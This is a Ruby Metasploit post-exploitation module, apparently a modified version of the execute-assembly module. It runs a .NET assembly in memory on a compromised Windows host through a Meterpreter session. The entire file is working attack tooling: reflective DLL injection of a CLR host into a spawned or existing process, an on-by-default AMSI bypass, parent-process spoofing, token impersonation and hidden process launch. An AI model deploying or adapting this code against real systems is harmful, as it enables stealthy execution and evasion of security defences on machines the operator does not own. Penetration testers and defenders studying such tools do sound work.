##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'base64'

class MetasploitModule < Msf::Post
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::ReflectiveDLLInjection
  include Msf::Post::Windows::Dotnet


  def initialize(info = {})
    super(update_info(info,
                      'Name'          => 'Execute .net Assembly',
                      'Description'   => '
                      This module execute a .net assembly in memory.
                      Refletctively load the dll that host CLR, than
                      copy in memory the assembly that will be executed.
                      Credits for Amsi bypass to Rastamouse (@_RastaMouse)
                      ',
                      'License'       => MSF_LICENSE,
                      'Author'        => 'b4rtik,funywolf',
                      'Arch'          => [ARCH_X64, ARCH_X86],
                      'Platform'      => 'win',
                      'SessionTypes'  => ['meterpreter'],
                      'Targets'       =>
                              [
                                      ['Windows x86', {'Arch' => ARCH_X86}],
                                      ['Windows x64', {'Arch' => ARCH_X64}],
                              ],
                      'References'    => [
                              ['URL', 'https://b4rtik.blogspot.com/2018/12/execute-assembly-via-meterpreter-session.html']
                      ],
                      'DefaultTarget' => 0))
    register_options(
            [
                    OptString.new('ASSEMBLY', [true, 'Assembly file name']),
                    OptString.new('ARGUMENTS', [false, 'Command line arguments']),
                    OptString.new('PROCESS', [false, 'Process to spawn', 'notepad.exe']),
                    OptString.new('USETHREADTOKEN', [false, 'Spawn process with thread impersonation', true]),
                    OptInt.new('PID', [false, 'Pid  to inject', 0]),
                    OptInt.new('PPID', [false, 'Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing)', 0]),
                    OptBool.new('AMSIBYPASS', [true, 'Enable Amsi bypass', true]),
                    OptInt.new('WAIT', [false, 'Time in seconds to wait', 1])
            ], self.class
    )
    register_advanced_options(
            [
                    OptBool.new('KILL', [true, 'Kill the injected process at the end of the task', false])
            ]
    )
  end

  def run

    if File.file?(File.join(Msf::Config.loot_directory, datastore['ASSEMBLY']))
      exe_path = File.join(Msf::Config.loot_directory, datastore['ASSEMBLY'])
    elsif File.file?(datastore['ASSEMBLY'])
      exe_path = datastore['ASSEMBLY']
    else
      pub_json_result(false,
                      "#{datastore['ASSEMBLY']} not found",
                      nil,
                      self.uuid)
      return
    end

    installed_dotnet_versions = get_dotnet_versions
    print_status("Dot Net Versions installed on target: #{installed_dotnet_versions}")
    print_status_redis("Dot Net Versions installed on target: #{installed_dotnet_versions}")
    if installed_dotnet_versions == []
      pub_json_result(false,
                      'Target has no .NET framework installed',
                      nil,
                      self.uuid)
      return
    end

    exe_clr_version = find_required_clr(exe_path)
    print_status_redis("Assembly CLR version required #{exe_clr_version}")

    if check_requirements(exe_clr_version, installed_dotnet_versions) == false

      pub_json_result(false,
                      'CLR required for assembly not installed',
                      nil,
                      self.uuid)
      return
    end

    process, hprocess = if datastore['PID'] <= 0
                          launch_process
                        else
                          hook_process
                        end
    if process == nil
      pub_json_result(false,
                      "Fail to open process on target",
                      nil,
                      self.uuid)
      return
    end


    exploit_mem, offset = inject_hostclr_dll(hprocess)

    assembly_mem = copy_assembly(exe_path, hprocess)

    print_status('Executing...')
    nthread = hprocess.thread.create(exploit_mem + offset, assembly_mem)

    sleep(datastore['WAIT'])

    if datastore['PID'] <= 0
      output = get_exe_output(process)
      if datastore['KILL']
        print_good("Killing process #{hprocess.pid}")
        client.sys.process.kill(hprocess.pid)
      end
      pub_json_result(true,
                      nil,
                      Base64.encode64(output),
                      self.uuid)
    else
      pub_json_result(true,
                      nil,
                      Base64.encode64("Run finish and do not read output"),
                      self.uuid)
      print_good('Execution finished.')
    end

  end


  def sanitize_process_name(process_name)
    out_process_name = if process_name.split(//).last(4).join.eql? '.exe'
                         process_name
                       else
                         process_name + '.exe'
                       end
    out_process_name
  end

  def pid_exists(pid)
    mypid = client.sys.process.getpid.to_i

    if pid == mypid
      print_bad('Can not select the current process as the injection target')
      return false
    end

    host_processes = client.sys.process.get_processes
    if host_processes.length < 1
      print_bad("No running processes found on the target host.")
      return false
    end

    theprocess = host_processes.find { |x| x["pid"] == pid }

    !theprocess.nil?
  end

  def find_required_clr(exe_path)
    filecontent = File.read(exe_path).bytes
    sign        = 'v4.0.30319'.bytes
    filecontent.each_with_index do |_item, index|
      sign.each_with_index do |subitem, indexsub|
        if subitem.to_s(16) != filecontent[index + indexsub].to_s(16)
          break
        else
          if indexsub == 9
            vprint_status('CLR versione required v4.0.30319')

            return 'v4.0.30319'
          end
        end
      end
    end
    vprint_status('CLR versione required v2.0.50727')

    return 'v2.0.50727'
  end

  def check_requirements(clr_req, installed_dotnet_versions)
    installed_dotnet_versions.each do |fi|
      if clr_req == 'v4.0.30319'
        if fi[0] == '4'
          vprint_status('Requirements ok')
          return true
        end
      else
        if fi[0] == '3' || fi[0] == '2'
          vprint_status('Requirements ok')
          return true
        end
      end
    end
    vprint_status('Requirements ko')
    return false
  end

  def pid_exists(pid)
    mypid = client.sys.process.getpid.to_i

    if pid == mypid
      print_bad('Can not select the current process as the injection target')
      return false
    end

    host_processes = client.sys.process.get_processes
    if host_processes.empty?
      print_bad('No running processes found on the target host.')
      return false
    end

    theprocess = host_processes.find { |x| x['pid'] == pid }

    !theprocess.nil?
  end

  def launch_process
    if (datastore['PPID'] != 0) && !pid_exists(datastore['PPID'])
      print_error("Process #{datastore['PPID']} was not found")
      print_error_redis("Process #{datastore['PPID']} was not found")
      datastore['PPID'] = 0
    elsif datastore['PPID'] != 0
      print_status("Spoofing PPID #{datastore['PPID']}")
      print_status_redis("Spoofing PPID #{datastore['PPID']}")
    end
    process_name = sanitize_process_name(datastore['PROCESS'])
    print_status("Launching #{process_name} to host CLR...")
    channelized = true
    if datastore['PID'] > 0
      channelized = false
    end
    impersonation = true
    if datastore['USETHREADTOKEN'] == false
      impersonation = false
    end
    process  = client.sys.process.execute(process_name, nil, {
            'Channelized'    => channelized,
            'Hidden'         => true,
            'UseThreadToken' => impersonation,
            'ParentPid'      => datastore['PPID']
    })
    hprocess = client.sys.process.open(process.pid, PROCESS_ALL_ACCESS)
    print_good("Process #{hprocess.pid} launched.")
    print_good_redis("Process #{hprocess.pid} launched.")
    [process, hprocess]
  end


  def inject_hostclr_dll(process)
    print_status("Reflectively injecting the Host DLL into #{process.pid}..")

    if client.arch == ARCH_X86
      library_path = ::File.join(Msf::Config.data_directory,
                                 'post', 'execute-assembly',
                                 'HostingCLRWin32.dll')
    else
      library_path = ::File.join(Msf::Config.data_directory,
                                 'post', 'execute-assembly',
                                 'HostingCLRx64.dll')

    end
    library_path = ::File.expand_path(library_path)

    print_status("Injecting Host into #{process.pid}...")
    exploit_mem, offset = inject_dll_into_process(process, library_path)
    [exploit_mem, offset]
  end

  def hook_process

    pid = datastore['PID'].to_i

    if pid_exists(pid)
      print_status("Opening handle to process #{datastore['PID']}...")
      hprocess = client.sys.process.open(datastore['PID'], PROCESS_ALL_ACCESS)
      print_good('Handle opened')
      print_good_redis('Handle opened')
      [nil, hprocess]
    else
      print_bad('Pid not found')
      print_error_redis('Pid not found')
      [nil, nil]
    end
  end

  def execute_assembly(exe_path)
    process, hprocess = if datastore['PID'] <= 0
                          launch_process
                        else
                          hook_process
                        end
    if process == nil
      pub_json_result(false,
                      "Fail to open process on target",
                      nil,
                      self.uuid)
      return
    end


    exploit_mem, offset = inject_hostclr_dll(hprocess)

    assembly_mem = copy_assembly(exe_path, hprocess)

    print_status('Executing...')
    nthread = hprocess.thread.create(exploit_mem + offset, assembly_mem)

    sleep(datastore['WAIT'])

    if datastore['PID'] <= 0
      output = get_exe_output(process)
      print_good("Killing process #{hprocess.pid}")
      hprocess.kill(hprocess.pid)
      pub_json_result(true,
                      nil,
                      Base64.encode64(output),
                      self.uuid)
    else
      pub_json_result(true,
                      nil,
                      Base64.encode64("Run finish and do not read output"),
                      self.uuid)
      print_good('Execution finished.')
    end

  end


  def copy_assembly(exe_path, process)
    print_status("Host injected. Copy assembly into #{process.pid}...")
    assembly_size = File.size(exe_path)
    if datastore['ARGUMENTS'].nil?
      argssize = 1
    else
      argssize = datastore['ARGUMENTS'].size + 1
    end

    params = [assembly_size].pack('I*')
    params += [argssize].pack('I*')
    if datastore['AMSIBYPASS'] == true
      params += "\x01"
    else
      params += "\x02"
    end
    if datastore['ARGUMENTS'].nil?
      params += ''
    else
      params += datastore['ARGUMENTS']
    end
    params += "\x00"

    payload      = params + File.read(exe_path)
    assembly_mem = inject_into_process(process, payload)
    print_status('Assembly copied.')
    assembly_mem
  end


  def get_exe_output(process)
    output = ""
    print_status('Start reading output')
    old_timeout             = client.response_timeout
    client.response_timeout = datastore['WAIT']
    begin
      loop do
        tmp = process.channel.read
        if !tmp.nil? && !tmp.empty?
          output = output + tmp
        else
          break
        end
      end
    rescue ::Exception => e
      #print_status("Error running assemply: #{e.class} #{e}")
    end
    client.response_timeout = old_timeout
    print_status('End output.')
    print(output)
    output
  end
end
